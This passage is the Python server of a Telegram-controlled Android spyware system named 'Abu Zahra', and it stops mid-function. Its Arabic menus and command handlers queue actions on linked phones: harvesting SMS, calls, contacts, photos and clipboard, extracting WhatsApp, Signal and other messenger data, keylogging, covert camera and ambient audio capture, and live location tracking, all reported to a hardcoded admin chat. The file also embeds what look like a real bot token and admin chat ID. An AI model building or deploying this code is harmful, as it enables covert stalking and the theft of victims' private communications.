#!/usr/bin/env python3
"""
أبو زهرة - خادم البوت الشامل
Complete Telegram Bot Server with Web Dashboard, getUpdates polling,
REST API, session management, and 100+ commands.
"""

import asyncio
import json
import os
import sys
import time
import uuid
import secrets
import hashlib
import logging
import traceback
from datetime import datetime, timezone, timedelta
from pathlib import Path
from urllib.parse import urlparse, parse_qs
from io import StringIO

import aiohttp
from aiohttp import web

# ═══════════════════════════════════════════════════════════════════════════════
# Configuration
# ═══════════════════════════════════════════════════════════════════════════════

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8898830696:AAGhrsmavkljSpF8d9SUw1XbM5syh4nzGF4")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "7344776596"))
SERVER_PORT = int(os.environ.get("SERVER_PORT", "8443"))
SESSION_SECRET = os.environ.get("SESSION_SECRET", "abu-zahra-secret-key-2025")
DATA_DIR = Path(__file__).parent / "data"

DEVICES_FILE = DATA_DIR / "devices.json"
SESSIONS_FILE = DATA_DIR / "sessions.json"
COMMANDS_FILE = DATA_DIR / "commands.json"
EVENTS_FILE = DATA_DIR / "events.json"
SETTINGS_FILE = DATA_DIR / "settings.json"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("abu-zahra")

# ═══════════════════════════════════════════════════════════════════════════════
# Global State
# ═══════════════════════════════════════════════════════════════════════════════

START_TIME = time.time()
messages_sent = 0
api_hits = 0
tg_offset = 0
_tg_session = None
polling_active = False
server_settings = {}

# ═══════════════════════════════════════════════════════════════════════════════
# Data Helpers
# ═══════════════════════════════════════════════════════════════════════════════

def ensure_data_dir():
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    defaults = {
        DEVICES_FILE: [],
        SESSIONS_FILE: [],
        COMMANDS_FILE: [],
        EVENTS_FILE: [],
        SETTINGS_FILE: {
            "sync_interval": 300,
            "location_interval": 60,
            "auto_location": True,
            "auto_sync": True,
            "language": "ar",
            "notifications": True,
            "keylogger": False,
            "sim_detect": False,
            "wifi_monitor": False,
            "geofences": [],
        },
    }
    for fpath, default in defaults.items():
        if not fpath.exists():
            fpath.write_text(json.dumps(default, ensure_ascii=False, indent=2))


def load_json(path: Path, default=None):
    try:
        return json.loads(path.read_text())
    except Exception:
        return default if default is not None else []


def save_json(path: Path, data):
    path.write_text(json.dumps(data, ensure_ascii=False, indent=2))


def append_event(event: str, details: dict = None, level: str = "info"):
    events = load_json(EVENTS_FILE, [])
    events.append({
        "time": datetime.now(timezone.utc).isoformat(),
        "event": event,
        "details": details or {},
        "level": level,
    })
    if len(events) > 1000:
        events = events[-1000:]
    save_json(EVENTS_FILE, events)
    log.info("[EVENT] %s | %s", event, details or "")


def load_settings() -> dict:
    return load_json(SETTINGS_FILE, {
        "sync_interval": 300,
        "location_interval": 60,
        "auto_location": True,
        "auto_sync": True,
        "language": "ar",
        "notifications": True,
        "keylogger": False,
        "sim_detect": False,
        "wifi_monitor": False,
        "geofences": [],
    })


def save_settings(settings: dict):
    save_json(SETTINGS_FILE, settings)


def ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def uptime():
    return int(time.time() - START_TIME)


def format_uptime(seconds):
    days = seconds // 86400
    hours = (seconds % 86400) // 3600
    minutes = (seconds % 3600) // 60
    secs = seconds % 60
    parts = []
    if days:
        parts.append(f"{days} يوم")
    if hours:
        parts.append(f"{hours} ساعة")
    if minutes:
        parts.append(f"{minutes} دقيقة")
    parts.append(f"{secs} ثانية")
    return "، ".join(parts)


# ═══════════════════════════════════════════════════════════════════════════════
# Device Helpers
# ═══════════════════════════════════════════════════════════════════════════════

def get_devices():
    return load_json(DEVICES_FILE, [])


def save_devices(devices):
    save_json(DEVICES_FILE, devices)


def find_device(device_id):
    devices = get_devices()
    for d in devices:
        if d.get("id") == device_id:
            return d
    return None


def update_device(device_id, updates: dict):
    devices = get_devices()
    for i, d in enumerate(devices):
        if d.get("id") == device_id:
            d.update(updates)
            d["last_seen"] = ts()
            devices[i] = d
            save_devices(devices)
            return d
    return None


def add_device(device_data: dict):
    devices = get_devices()
    for i, d in enumerate(devices):
        if d.get("id") == device_data.get("id"):
            device_data["last_seen"] = ts()
            devices[i] = device_data
            save_devices(devices)
            return device_data
    device_data["last_seen"] = ts()
    device_data["created_at"] = ts()
    devices.append(device_data)
    save_devices(devices)
    append_event("تسجيل جهاز جديد", {"id": device_data["id"], "name": device_data.get("name", "")})
    return device_data


def remove_device(device_id):
    devices = get_devices()
    new_devices = [d for d in devices if d.get("id") != device_id]
    if len(new_devices) == len(devices):
        return False
    save_devices(new_devices)
    append_event("حذف جهاز", {"id": device_id})
    return True


def get_first_device():
    devices = get_devices()
    return devices[0] if devices else None


# ═══════════════════════════════════════════════════════════════════════════════
# Command Queue Helpers
# ═══════════════════════════════════════════════════════════════════════════════

def queue_command(device_id: str, command: str, params: dict = None):
    commands = load_json(COMMANDS_FILE, [])
    cmd = {
        "id": str(uuid.uuid4())[:8],
        "device_id": device_id,
        "command": command,
        "params": params or {},
        "status": "pending",
        "created_at": ts(),
        "sent_at": None,
        "result": None,
    }
    commands.append(cmd)
    if len(commands) > 500:
        commands = commands[-500:]
    save_json(COMMANDS_FILE, commands)
    append_event("أمر جديد في الطابور", {"device_id": device_id, "command": command})
    return cmd


def get_pending_commands(device_id: str):
    commands = load_json(COMMANDS_FILE, [])
    return [c for c in commands if c.get("device_id") == device_id and c.get("status") == "pending"]


# ═══════════════════════════════════════════════════════════════════════════════
# Session Helpers
# ═══════════════════════════════════════════════════════════════════════════════

def get_sessions():
    return load_json(SESSIONS_FILE, [])


def save_sessions(sessions):
    save_json(SESSIONS_FILE, sessions)


def create_session(username: str, password: str) -> dict:
    sessions = get_sessions()
    settings = load_settings()
    admin_pass = settings.get("admin_password", "admin")
    if password != admin_pass:
        return None
    token = secrets.token_urlsafe(32)
    session = {
        "token": token,
        "username": username,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "expires_at": (datetime.now(timezone.utc) + timedelta(hours=24)).isoformat(),
        "ip": "",
        "user_agent": "",
    }
    sessions.append(session)
    if len(sessions) > 100:
        sessions = sessions[-100:]
    save_sessions(sessions)
    append_event("تسجيل دخول جديد", {"username": username})
    return session


def validate_session(token: str) -> dict:
    sessions = get_sessions()
    now = datetime.now(timezone.utc)
    for i, s in enumerate(sessions):
        if s.get("token") == token:
            expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
            if now > expires:
                sessions.pop(i)
                save_sessions(sessions)
                return None
            return s
    return None


def delete_session(token: str):
    sessions = get_sessions()
    new_sessions = [s for s in sessions if s.get("token") != token]
    save_sessions(new_sessions)


def cleanup_expired_sessions():
    sessions = get_sessions()
    now = datetime.now(timezone.utc)
    active = []
    for s in sessions:
        expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
        if now <= expires:
            active.append(s)
    save_sessions(active)


# ═══════════════════════════════════════════════════════════════════════════════
# Telegram API Helpers
# ═══════════════════════════════════════════════════════════════════════════════

def get_tg_session() -> aiohttp.ClientSession:
    global _tg_session
    if _tg_session is None or _tg_session.closed:
        _tg_session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))
    return _tg_session


async def tg_request(method: str, payload: dict = None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        session = get_tg_session()
        async with session.post(url, json=payload or {}) as resp:
            data = await resp.json()
            if not data.get("ok"):
                log.warning("TG %s error: %s", method, data.get("description", ""))
            return data
    except Exception as exc:
        log.error("TG %s failed: %s", method, exc)
        return None


async def send_message(chat_id, text: str, parse_mode: str = "HTML", reply_markup=None):
    global messages_sent
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    result = await tg_request("sendMessage", payload)
    if result and result.get("ok"):
        messages_sent += 1
    return result


async def send_admin(text: str, parse_mode: str = "HTML", reply_markup=None):
    return await send_message(ADMIN_CHAT_ID, text, parse_mode, reply_markup)


async def answer_callback_query(callback_query_id: str, text: str = "", show_alert: bool = False):
    return await tg_request("answerCallbackQuery", {
        "callback_query_id": callback_query_id,
        "text": text,
        "show_alert": show_alert,
    })


async def edit_message_text(chat_id, message_id, text: str, parse_mode: str = "HTML", reply_markup=None):
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode,
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    return await tg_request("editMessageText", payload)


# ═══════════════════════════════════════════════════════════════════════════════
# Inline Keyboard Builders
# ═══════════════════════════════════════════════════════════════════════════════

def inline_button(text, callback_data):
    return {"text": text, "callback_data": callback_data}


def inline_row(*buttons):
    return list(buttons)


def build_main_menu():
    return {
        "inline_keyboard": [
            [inline_button("📱 الأجهزة", "menu_devices")],
            [inline_button("📊 جمع البيانات", "menu_data")],
            [inline_button("🌐 الشبكات الاجتماعية", "menu_social")],
            [inline_button("🎮 التحكم عن بعد", "menu_control")],
            [inline_button("📍 الموقع الجغرافي", "menu_location")],
            [inline_button("⚙️ إدارة التطبيقات", "menu_apps")],
            [inline_button("🔧 الإعدادات", "menu_settings")],
            [inline_button("🔍 المراقبة", "menu_monitor")],
            [inline_button("🖥️ الخادم", "menu_server")],
        ]
    }


def build_back_menu():
    return {"inline_keyboard": [[inline_button("🔙 الرجوع للقائمة الرئيسية", "back_main")]]}


def build_devices_menu():
    devices = get_devices()
    rows = []
    for d in devices:
        status = "🟢" if d.get("active") else "🔴"
        name = d.get("name", d.get("id", "غير معروف"))
        rows.append([inline_button(f"{status} {name} ({d['id']})", f"dev_{d['id']}")])
    if not devices:
        rows.append([inline_button("لا توجد أجهزة", "no_action")])
    rows.append([inline_button("🔗 ربط جهاز جديد", "cmd_link")])
    rows.append([inline_button("🔙 الرجوع", "back_main")])
    return {"inline_keyboard": rows}


def build_device_menu(device_id):
    return {
        "inline_keyboard": [
            [inline_button("ℹ️ معلومات الجهاز", f"cmd_info_{device_id}")],
            [inline_button("🔋 البطارية", f"cmd_battery_{device_id}"),
             inline_button("📍 الموقع", f"cmd_location_{device_id}")],
            [inline_button("📲 الرسائل", f"cmd_sms_{device_id}"),
             inline_button("📞 المكالمات", f"cmd_calls_{device_id}")],
            [inline_button("📇 جهات الاتصال", f"cmd_contacts_{device_id}"),
             inline_button("🔔 الإشعارات", f"cmd_notifications_{device_id}")],
            [inline_button("📸 لقطات الشاشة", f"cmd_screenshot_{device_id}"),
             inline_button("📷 الكاميرا", f"cmd_camera_{device_id}")],
            [inline_button("📋 الحافظة", f"cmd_clipboard_{device_id}"),
             inline_button("📲 التطبيقات", f"cmd_apps_{device_id}")],
            [inline_button("🌐 الشبكات الاجتماعية", f"social_{device_id}")],
            [inline_button("🎮 التحكم", f"control_{device_id}")],
            [inline_button("🗑️ حذف الجهاز", f"unlink_{device_id}")],
            [inline_button("🔙 الرجوع للأجهزة", "menu_devices")],
        ]
    }


def build_data_menu(device_id):
    if not device_id:
        d = get_first_device()
        device_id = d["id"] if d else "none"
    return {
        "inline_keyboard": [
            [inline_button("📲 الرسائل SMS", f"cmd_sms_{device_id}")],
            [inline_button("📞 سجل المكالمات", f"cmd_calls_{device_id}")],
            [inline_button("📇 جهات الاتصال", f"cmd_contacts_{device_id}")],
            [inline_button("📍 الموقع الجغرافي", f"cmd_location_{device_id}")],
            [inline_button("🔔 الإشعارات", f"cmd_notifications_{device_id}")],
            [inline_button("📱 التطبيقات المثبتة", f"cmd_apps_{device_id}")],
            [inline_button("ℹ️ معلومات الجهاز", f"cmd_info_{device_id}")],
            [inline_button("🔋 حالة البطارية", f"cmd_battery_{device_id}")],
            [inline_button("🖼️ المعرض", f"cmd_gallery_{device_id}")],
            [inline_button("📋 الحافظة", f"cmd_clipboard_{device_id}")],
            [inline_button("📥 جميع البيانات", f"cmd_all_{device_id}")],
            [inline_button("🔙 الرجوع", "back_main")],
        ]
    }


def build_social_menu(device_id):
    if not device_id:
        d = get_first_device()
        device_id = d["id"] if d else "none"
    return {
        "inline_keyboard": [
            [inline_button("💬 واتساب", f"cmd_whatsapp_{device_id}")],
            [inline_button("✈️ تليجرام", f"cmd_telegram_{device_id}")],
            [inline_button("📷 انستجرام", f"cmd_instagram_{device_id}")],
            [inline_button("🔵 ماسنجر", f"cmd_messenger_{device_id}")],
            [inline_button("👻 سناب شات", f"cmd_snapchat_{device_id}")],
            [inline_button("🎵 تيك توك", f"cmd_tiktok_{device_id}")],
            [inline_button("🐦 تويتر", f"cmd_twitter_{device_id}")],
            [inline_button("💜 فايبر", f"cmd_viber_{device_id}")],
            [inline_button("🔵 سيجنال", f"cmd_signal_{device_id}")],
            [inline_button("🔙 الرجوع", "back_main")],
        ]
    }


def build_control_menu(device_id):
    if not device_id:
        d = get_first_device()
        device_id = d["id"] if d else "none"
    return {
        "inline_keyboard": [
            [inline_button("📡 فحص الاتصال", f"cmd_ping_{device_id}")],
            [inline_button("📳 اهتزاز", f"cmd_vibrate_{device_id}")],
            [inline_button("🔔 رنين", f"cmd_ring_{device_id}")],
            [inline_button("📸 لقطة شاشة", f"cmd_screenshot_{device_id}")],
            [inline_button("📷 كاميرا أمامية", f"cmd_front_camera_{device_id}")],
            [inline_button("📷 كاميرا خلفية", f"cmd_back_camera_{device_id}")],
            [inline_button("🎙️ تسجيل صوت", f"cmd_record_audio_{device_id}")],
            [inline_button("🔦 تشغيل الفلاش", f"cmd_flash_on_{device_id}")],
            [inline_button("🔦 إطفاء الفلاش", f"cmd_flash_off_{device_id}")],
            [inline_button("🔙 الرجوع", "back_main")],
        ]
    }


def build_camera_menu(device_id):
    return {
        "inline_keyboard": [
            [inline_button("📷 كاميرا أمامية", f"cmd_front_camera_{device_id}")],
            [inline_button("📷 كاميرا خلفية", f"cmd_back_camera_{device_id}")],
            [inline_button("🔙 الرجوع", f"control_{device_id}")],
        ]
    }


def build_location_menu(device_id):
    if not device_id:
        d = get_first_device()
        device_id = d["id"] if d else "none"
    return {
        "inline_keyboard": [
            [inline_button("📍 الموقع الحالي", f"cmd_location_{device_id}")],
            [inline_button("🗺️ تتبع مباشر", f"cmd_location_live_{device_id}")],
            [inline_button("⏹️ إيقاف التتبع", f"cmd_location_stop_{device_id}")],
            [inline_button("📜 سجل المواقع", f"cmd_location_history_{device_id}")],
            [inline_button("🎮 المناطق الجغرافية", "cmd_geo_fence")],
            [inline_button("🔙 الرجوع", "back_main")],
        ]
    }


def build_apps_menu(device_id):
    if not device_id:
        d = get_first_device()
        device_id = d["id"] if d else "none"
    return {
        "inline_keyboard": [
            [inline_button("📱 التطبيقات المثبتة", f"cmd_apps_{device_id}")],
            [inline_button("📊 استخدام التطبيقات", f"cmd_app_usage_{device_id}")],
            [inline_button("⏱️ وقت الشاشة", f"cmd_screen_time_{device_id}")],
            [inline_button("🔙 الرجوع", "back_main")],
        ]
    }


def build_settings_menu():
    return {
        "inline_keyboard": [
            [inline_button("⏱️ فترة المزامنة", "cmd_set_interval")],
            [inline_button("📍 فترة الموقع", "cmd_set_location_interval")],
            [inline_button("🗺️ الموقع التلقائي", "cmd_auto_location")],
            [inline_button("🔄 المزامنة التلقائية", "cmd_auto_sync")],
            [inline_button("🌐 اللغة", "cmd_language")],
            [inline_button("🔔 الإشعارات", "cmd_notify")],
            [inline_button("🔙 الرجوع", "back_main")],
        ]
    }


def build_monitor_menu(device_id):
    if not device_id:
        d = get_first_device()
        device_id = d["id"] if d else "none"
    return {
        "inline_keyboard": [
            [inline_button("⌨️ تسجيل المفاتيح", f"cmd_keylogger_{device_id}")],
            [inline_button("📥 بيانات المفاتيح", f"cmd_keylogger_get_{device_id}")],
            [inline_button("📡 كشف تغيير الشريحة", f"cmd_sim_detect_{device_id}")],
            [inline_button("📶 مراقبة الواي فاي", f"cmd_wifi_monitor_{device_id}")],
            [inline_button("🔙 الرجوع", "back_main")],
        ]
    }


def build_server_menu():
    return {
        "inline_keyboard": [
            [inline_button("📊 حالة الخادم", "cmd_server_status")],
            [inline_button("🔄 إعادة تشغيل", "cmd_server_restart")],
            [inline_button("🗑️ مسح البيانات", "cmd_clear_data")],
            [inline_button("💾 نسخ احتياطي", "cmd_backup")],
            [inline_button("📤 تصدير البيانات", "cmd_export")],
            [inline_button("📈 الإحصائيات", "cmd_stats")],
            [inline_button("🔙 الرجوع", "back_main")],
        ]
    }


# ═══════════════════════════════════════════════════════════════════════════════
# Telegram Command Handlers
# ═══════════════════════════════════════════════════════════════════════════════

async def cmd_start(chat_id):
    text = (
        "🟥 <b>أبو زهرة - خادم الإدارة</b>\n\n"
        "مرحباً بك في لوحة التحكم الشاملة\n"
        "يمكنك إدارة جميع الأجهزة والتحكم بها\n\n"
        f"🟢 الخادم يعمل منذ: <code>{format_uptime(uptime())}</code>\n"
        f"📱 عدد الأجهزة: <code>{len(get_devices())}</code>\n"
        f"📡 المنفذ: <code>{SERVER_PORT}</code>"
    )
    await send_message(chat_id, text, reply_markup=build_main_menu())


async def cmd_help(chat_id):
    text = (
        "📖 <b>دليل الأوامر - أبو زهرة</b>\n\n"
        "📋 <b>الأوامر الأساسية:</b>\n"
        "/start - القائمة الرئيسية\n"
        "/help - عرض المساعدة\n"
        "/status - حالة البوت\n"
        "/devices - قائمة الأجهزة\n\n"
        "📱 <b>أوامر الأجهزة:</b>\n"
        "/link - ربط جهاز جديد\n"
        "/device [id] - تفاصيل جهاز\n"
        "/unlink [id] - فصل جهاز\n\n"
        "📊 <b>جمع البيانات:</b>\n"
        "/sms [id] - الرسائل\n"
        "/calls [id] - المكالمات\n"
        "/contacts [id] - جهات الاتصال\n"
        "/location [id] - الموقع\n"
        "/notifications [id] - الإشعارات\n"
        "/apps [id] - التطبيقات\n"
        "/all [id] - جميع البيانات\n\n"
        "🎮 <b>التحكم عن بعد:</b>\n"
        "/ping [id] - فحص الاتصال\n"
        "/vibrate [id] - اهتزاز\n"
        "/ring [id] - رنين\n"
        "/screenshot [id] - لقطة شاشة\n\n"
        "🔧 <b>لمزيد من الأوامر استخدم القائمة:</b>\n"
        "/menu"
    )
    await send_message(chat_id, text, reply_markup=build_back_menu())


async def cmd_status(chat_id):
    devices = get_devices()
    online = sum(1 for d in devices if d.get("active"))
    events = load_json(EVENTS_FILE, [])
    commands = load_json(COMMANDS_FILE, [])
    pending = sum(1 for c in commands if c.get("status") == "pending")
    text = (
        "📊 <b>حالة البوت والخادم</b>\n\n"
        f"🟢 الحالة: <code>يعمل</code>\n"
        f"⏱️ وقت التشغيل: <code>{format_uptime(uptime())}</code>\n"
        f"📡 المنفذ: <code>{SERVER_PORT}</code>\n"
        f"🕐 الوقت: <code>{ts()}</code>\n\n"
        f"📱 الأجهزة: <code>{len(devices)}</code> (🟢 {online} متصل)\n"
        f"📨 الرسائل المرسلة: <code>{messages_sent}</code>\n"
        f"📋 الأوامر المعلقة: <code>{pending}</code>\n"
        f"📝 الأحداث: <code>{len(events)}</code>"
    )
    await send_message(chat_id, text, reply_markup=build_back_menu())


async def cmd_devices(chat_id):
    devices = get_devices()
    if not devices:
        await send_message(chat_id, "📱 لا توجد أجهزة مسجلة\nاستخدم /link لربط جهاز جديد", reply_markup=build_back_menu())
        return
    text = "📱 <b>قائمة الأجهزة</b>\n\n"
    for d in devices:
        status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
        name = d.get("name", d.get("model", "غير معروف"))
        text += (
            f"{'━'*20}\n"
            f"📱 <b>{name}</b>\n"
            f"   المعرف: <code>{d['id']}</code>\n"
            f"   الحالة: {status}\n"
            f"   آخر نشاط: <code>{d.get('last_seen', '—')}</code>\n"
        )
    await send_message(chat_id, text, reply_markup=build_devices_menu())


async def cmd_link(chat_id):
    code = secrets.token_urlsafe(6).upper()[:8]
    settings = load_settings()
    settings["link_code"] = code
    settings["link_code_expires"] = (datetime.now(timezone.utc) + timedelta(minutes=10)).isoformat()
    save_settings(settings)
    text = (
        "🔗 <b>ربط جهاز جديد</b>\n\n"
        f"🔑 كود الربط: <code>{code}</code>\n\n"
        "أدخل هذا الكود في تطبيق Android\n"
        "⏱️ صالح لمدة 10 دقائق\n\n"
        "سيتم إشعارك عند نجاح الربط"
    )
    append_event("إنشاء كود ربط", {"code": code})
    await send_message(chat_id, text, reply_markup=build_back_menu())


async def cmd_unlink(chat_id, device_id):
    if not device_id:
        await send_message(chat_id, "❌ المعرف مطلوب\nالاستخدام: /unlink device_id", reply_markup=build_back_menu())
        return
    if remove_device(device_id):
        append_event("فصل جهاز", {"id": device_id})
        await send_message(chat_id, f"✅ تم فصل الجهاز <code>{device_id}</code>", reply_markup=build_devices_menu())
    else:
        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_menu())


async def cmd_device(chat_id, device_id):
    if not device_id:
        await send_message(chat_id, "❌ المعرف مطلوب\nالاستخدام: /device device_id", reply_markup=build_back_menu())
        return
    d = find_device(device_id)
    if not d:
        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_menu())
        return
    status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
    text = (
        f"📱 <b>تفاصيل الجهاز</b>\n\n"
        f"{'━'*20}\n"
        f"📱 الاسم: <code>{d.get('name', '—')}</code>\n"
        f"🆔 المعرف: <code>{d['id']}</code>\n"
        f"📊 الحالة: {status}\n"
        f"📱 الموديل: <code>{d.get('model', '—')}</code>\n"
        f"🤖 النظام: <code>{d.get('os', '—')}</code>\n"
        f"🔋 البطارية: <code>{d.get('battery', '—')}%</code>\n"
        f"📶 الشبكة: <code>{d.get('network', '—')}</code>\n"
        f"📍 الموقع: <code>{d.get('location', '—')}</code>\n"
        f"🕐 آخر نشاط: <code>{d.get('last_seen', '—')}</code>\n"
        f"📅 تاريخ التسجيل: <code>{d.get('created_at', '—')}</code>\n"
    )
    extra = d.get("extra", {})
    if extra:
        text += f"\n📋 معلومات إضافية: <code>{json.dumps(extra, ensure_ascii=False)[:200]}</code>"
    await send_message(chat_id, text, reply_markup=build_device_menu(device_id))


async def send_device_command(chat_id, device_id, command_name, display_name):
    if not device_id or device_id == "none":
        await send_message(chat_id, "❌ لا يوجد جهاز. استخدم /link لربط جهاز.", reply_markup=build_back_menu())
        return
    d = find_device(device_id)
    if not d:
        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_menu())
        return
    cmd = queue_command(device_id, command_name)
    text = (
        f"📤 <b>{display_name}</b>\n\n"
        f"📱 الجهاز: <code>{d.get('name', device_id)}</code>\n"
        f"📋 الأمر: <code>{command_name}</code>\n"
        f"🆔 معرف الأمر: <code>{cmd['id']}</code>\n\n"
        f"⏳ في انتظار استجابة الجهاز..."
    )
    await send_message(chat_id, text, reply_markup=build_device_menu(device_id))


async def handle_command(chat_id, text: str):
    parts = text.strip().split(maxsplit=2)
    cmd = parts[0].lower()
    args = parts[1:] if len(parts) > 1 else []
    arg1 = args[0] if args else ""
    arg2 = args[1] if len(args) > 1 else ""

    if not arg1:
        d = get_first_device()
        dev_id = d["id"] if d else ""
    else:
        dev_id = arg1

    log.info("CMD from %s: %s args=%s", chat_id, cmd, args)
    append_event("أمر تليجرام", {"command": cmd, "args": args})

    # ── Basic Commands ──
    if cmd == "/start":
        await cmd_start(chat_id)
    elif cmd == "/help":
        await cmd_help(chat_id)
    elif cmd == "/menu":
        text = "📋 <b>القائمة الرئيسية</b>\nاختر أحد الأقسام:"
        await send_message(chat_id, text, reply_markup=build_main_menu())
    elif cmd == "/status":
        await cmd_status(chat_id)

    # ── Device Commands ──
    elif cmd == "/devices" or cmd == "/devices_list":
        await cmd_devices(chat_id)
    elif cmd == "/link":
        await cmd_link(chat_id)
    elif cmd == "/unlink":
        await cmd_unlink(chat_id, arg1)
    elif cmd == "/device":
        await cmd_device(chat_id, arg1)

    # ── Data Collection Commands ──
    elif cmd == "/sms":
        await send_device_command(chat_id, dev_id, "get_sms", "📲 جلب الرسائل SMS")
    elif cmd == "/calls":
        await send_device_command(chat_id, dev_id, "get_calls", "📞 جلب سجل المكالمات")
    elif cmd == "/contacts":
        await send_device_command(chat_id, dev_id, "get_contacts", "📇 جلب جهات الاتصال")
    elif cmd == "/location":
        await send_device_command(chat_id, dev_id, "get_location", "📍 جلب الموقع")
    elif cmd == "/notifications":
        await send_device_command(chat_id, dev_id, "get_notifications", "🔔 جلب الإشعارات")
    elif cmd == "/apps":
        await send_device_command(chat_id, dev_id, "get_apps", "📱 جلب التطبيقات")
    elif cmd == "/info":
        await send_device_command(chat_id, dev_id, "get_info", "ℹ️ جلب معلومات الجهاز")
    elif cmd == "/battery":
        await send_device_command(chat_id, dev_id, "get_battery", "🔋 جلب حالة البطارية")
    elif cmd == "/gallery":
        await send_device_command(chat_id, dev_id, "get_gallery", "🖼️ جلب المعرض")
    elif cmd == "/clipboard":
        await send_device_command(chat_id, dev_id, "get_clipboard", "📋 جلب الحافظة")
    elif cmd == "/all":
        await send_device_command(chat_id, dev_id, "get_all", "📥 جلب جميع البيانات")

    # ── Social Media Commands ──
    elif cmd == "/whatsapp":
        await send_device_command(chat_id, dev_id, "get_whatsapp", "💬 جلب بيانات واتساب")
    elif cmd == "/telegram_app":
        await send_device_command(chat_id, dev_id, "get_telegram", "✈️ جلب بيانات تليجرام")
    elif cmd == "/instagram":
        await send_device_command(chat_id, dev_id, "get_instagram", "📷 جلب بيانات انستجرام")
    elif cmd == "/messenger":
        await send_device_command(chat_id, dev_id, "get_messenger", "🔵 جلب بيانات ماسنجر")
    elif cmd == "/snapchat":
        await send_device_command(chat_id, dev_id, "get_snapchat", "👻 جلب بيانات سناب شات")
    elif cmd == "/tiktok":
        await send_device_command(chat_id, dev_id, "get_tiktok", "🎵 جلب بيانات تيك توك")
    elif cmd == "/twitter":
        await send_device_command(chat_id, dev_id, "get_twitter", "🐦 جلب بيانات تويتر")
    elif cmd == "/viber":
        await send_device_command(chat_id, dev_id, "get_viber", "💜 جلب بيانات فايبر")
    elif cmd == "/signal":
        await send_device_command(chat_id, dev_id, "get_signal", "🔵 جلب بيانات سيجنال")

    # ── Remote Control Commands ──
    elif cmd == "/ping":
        await send_device_command(chat_id, dev_id, "ping", "📡 فحص اتصال الجهاز")
    elif cmd == "/vibrate":
        await send_device_command(chat_id, dev_id, "vibrate", "📳 اهتزاز الجهاز")
    elif cmd == "/ring":
        await send_device_command(chat_id, dev_id, "ring", "🔔 رنين الجهاز")
    elif cmd == "/screenshot":
        await send_device_command(chat_id, dev_id, "screenshot", "📸 لقطة شاشة")
    elif cmd == "/front_camera":
        await send_device_command(chat_id, dev_id, "front_camera", "📷 كاميرا أمامية")
    elif cmd == "/back_camera":
        await send_device_command(chat_id, dev_id, "back_camera", "📷 كاميرا خلفية")
    elif cmd == "/record_audio":
        await send_device_command(chat_id, dev_id, "record_audio", "🎙️ تسجيل صوت محيط")
    elif cmd == "/flash_on":
        await send_device_command(chat_id, dev_id, "flash_on", "🔦 تشغيل الفلاش")
    elif cmd == "/flash_off":
        await send_device_command(chat_id, dev_id, "flash_off", "🔦 إطفاء الفلاش")

    # ── Location Commands ──
    elif cmd == "/location_live":
        await send_device_command(chat_id, dev_id, "location_live", "🗺️ بدء التتبع المباشر")
    elif cmd == "/location_stop":
        await send_device_command(chat_id, dev_id, "location_stop", "⏹️ إيقاف التتبع")
    elif cmd == "/location_history":
        await send_device_command(chat_id, dev_id, "location_history", "📜 سجل المواقع")
    elif cmd == "/geo_fence":
        settings = load_settings()
        fences = settings.get("geofences", [])
        text = "🎮 <b>المناطق الجغرافية</b>\n\n"
        if fences:
            for i, f in enumerate(fences):
                text += f"{i+1}. {f.get('name', 'غير مسمى')} - نصف القطر: {f.get('radius', 0)}م\n"
        else:
            text += "لا توجد مناطق محددة\n\n"
            text += "📋 الإجراءات:\n"
            text += "/geo_add اسم lat lng radius - إضافة منطقة\n"
            text += "/geo_remove رقم - حذف منطقة\n"
            text += "/geo_list - عرض المناطق"
        await send_message(chat_id, text, reply_markup=build_location_menu(dev_id))

    # ── App Management Commands ──
    elif cmd == "/open_app":
        await send_device_command(chat_id, dev_id, "open_app", f"📱 فتح التطبيق: {arg2}")
    elif cmd == "/install_app":
        await send_device_command(chat_id, dev_id, "install_app", f"📥 تثبيت التطبيق: {arg2}")
    elif cmd == "/uninstall_app":
        await send_device_command(chat_id, dev_id, "uninstall_app", f"🗑️ إلغاء تثبيت: {arg2}")
    elif cmd == "/block_app":
        await send_device_command(chat_id, dev_id, "block_app", f"🚫 حظر التطبيق: {arg2}")
    elif cmd == "/unblock_app":
        await send_device_command(chat_id, dev_id, "unblock_app", f"✅ إلغاء حظر: {arg2}")
    elif cmd == "/app_usage":
        await send_device_command(chat_id, dev_id, "app_usage", "📊 استخدام التطبيقات")
    elif cmd == "/screen_time":
        await send_device_command(chat_id, dev_id, "screen_time", "⏱️ وقت الشاشة")

    # ── Settings Commands ──
    elif cmd == "/set_interval":
        settings = load_settings()
        if arg1 and arg1.isdigit():
            settings["sync_interval"] = int(arg1)
            save_settings(settings)
            await send_message(chat_id, f"✅ تم تعيين فترة المزامنة: <code>{arg1}</code> ثانية", reply_markup=build_settings_menu())
        else:
            await send_message(chat_id, f"⏱️ فترة المزامنة الحالية: <code>{settings.get('sync_interval', 300)}</code> ثانية\n\nالاستخدام: /set_interval ثوانٍ", reply_markup=build_settings_menu())
    elif cmd == "/set_location_interval":
        settings = load_settings()
        if arg1 and arg1.isdigit():
            settings["location_interval"] = int(arg1)
            save_settings(settings)
            await send_message(chat_id, f"✅ تم تعيين فترة الموقع: <code>{arg1}</code> ثانية", reply_markup=build_settings_menu())
        else:
